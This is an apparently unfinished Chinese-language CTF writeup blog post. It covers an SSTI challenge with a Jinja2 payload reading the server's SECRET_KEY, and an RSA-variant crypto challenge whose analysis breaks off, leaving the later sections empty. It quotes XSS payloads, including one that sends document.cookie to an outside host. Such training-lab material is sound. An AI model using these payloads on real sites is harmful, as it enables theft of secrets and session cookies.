---
title: SCIST S4 資訊安全季後賽 Writeup
categories: CTF
tags:
- 資安
- SCIST
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/images 
---

# 0X00 前言

終於到了SCIST課程結束後的季後賽。我知道我自己肯定還有很多不足的地方，不過依然是挺期待這次的比賽，希望可以再讓自己更進步點。不過沒想到居然只解出兩題...多多少少還是有點打擊自己的信心的。不知道是不是比較沒有天分，又或是說準備的方式有錯誤，總之就是對自己這種好像一直有在學習新知識但比賽卻都沒看見成效的狀態有點自責 + 受挫。不過還是先直接進Writeup看一下我的解題過程吧！

# 0X01 Web

## formatter

這題是一個文字的格式化器，說是格式化，他其實只是把兩邊加上貓貓XD。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240714145845517.png)

如果你輸入了一些文字進去，他就會兩邊加上貓貓回傳回來。舉例來說，我先輸入`Test`然後點Submit，就會出現`😺 Test 😺`。稍微查詢了一下後，發現這題可能是個伺服器模板注入（Server Side Template Injection, SSTI）。這種漏洞就是攻擊者把惡意的代碼注入伺服器端的模板並操控模板引擎執行那些惡意代碼。而這題好像也確實有這個漏洞的存在，因為當我們輸入

```jinja2
{% for c in config["SECRET_KEY"] %}
{{c}}
{% endfor %}
```

他回傳的內容會是`😺 c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c 😺`，這長度看起來和Flag差不多（?）。到這邊，我就卡住了。這裡之所以只會輸出`c`是因為伺服器代碼中有針對使用者輸入做過濾和替換，會把`{{`和`}}`替換為空字元，如下。

```python
if request.method == "POST":
        rawtext = request.form.get("rawtext")
        mappings = {"{{": "", "}}": "", ".": "...", "(": ""}
        for mapping in mappings:
            rawtext = rawtext.replace(mapping, mappings[mapping])
        rawtext = "😺 " + rawtext + " 😺"
        return render_template_string(rawtext)
```

到這邊卡住之後，我有看到題目的資料夾中還有另外一個資料夾，名稱叫做notes。打開來看發現裡面都是一堆像是XSS的Payload，舉幾個例子。

- `<svg/onload=alert(1)>`
- `<svg/onload=fetch('http://dev.vincent55.tw:8787?a='+document.cookie)>`

然後還有一個是Rickroll的連結XD（https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUEcmljaw%3D%3D）。所以到了這時候我就一直很疑惑為甚麼會出現這些notes，是不是要提示我們這題是XSS。結果就到了最後還是沒解出這題。

# 0X02 Crypto

## Smoothie

直接看題目吧，我把題目給的加密腳本跟密文 + 公鑰放在一起了。

```python
from Crypto.Util.number import bytes_to_long, getPrime, isPrime, size
from Crypto.Random.random import randrange

from secret import FLAG, SIZE


def mango_a_go_go() -> int:
    while True:
        p = 2
        while size(p) < SIZE:
            p *= getPrime(randrange(2, 12)) 
        if isPrime(p - 1):
            return p - 1


def strawberries_wild() -> int:
    while True:
        p = 2
        while size(p) < SIZE:
            p *= getPrime(randrange(2, 12))
        if isPrime(p + 1):
            return p + 1


def yogurt() -> int:
    return getPrime(SIZE) ** 2


def main():
    e = 0x10001  
    smoothie = strawberries_wild() * mango_a_go_go() * yogurt()
    flag = bytes_to_long(FLAG.encode())
    flag = pow(flag, e, smoothie)
    print(f"flag = {flag}")
    print(f"smoothie = {smoothie}")


if __name__ == "__main__":
    main()

# flag = 469221284029086826023747997560431390782361982638061257450599210708962645002102847975462660638193645789450754543161479618083250809660166042502944853280554224255633426448658481032615217773743807123912268129954755529085653283483845209697030918916368538410596291283961216415664601562539040139144815815020812381504
# smoothie = 697628240852435861833732827649361589992628854136683558886480614847121218068368409674997942839000556721079790078853783722095774006008786802855171763400576735341062935016809334479917656367316628949895516450621001020141725837414164848350808778574391917507635861296067849758069488027024995888841277834894925864271
# e = 65537
```

看完之後應該會發現它就是個RSA的變形。原本RSA中的n在這裡叫做smoothie，但是原本的n應該是由兩個大質數p跟q所相乘得到的，這題則是由兩個質數和另一個質數的平方相乘所得到的。其中兩個質數是由`mango_a_go_go()`和`strawberries_wild()`得到的，而另一個質數的平方則由`yogurt()`算得。

題目分析到這邊之後，我的思路是去找到歐拉函數$\phi$，

# 0X03 Reverse

# 0X04 Pwn

# 0X05 Misc

# 0X06 心得

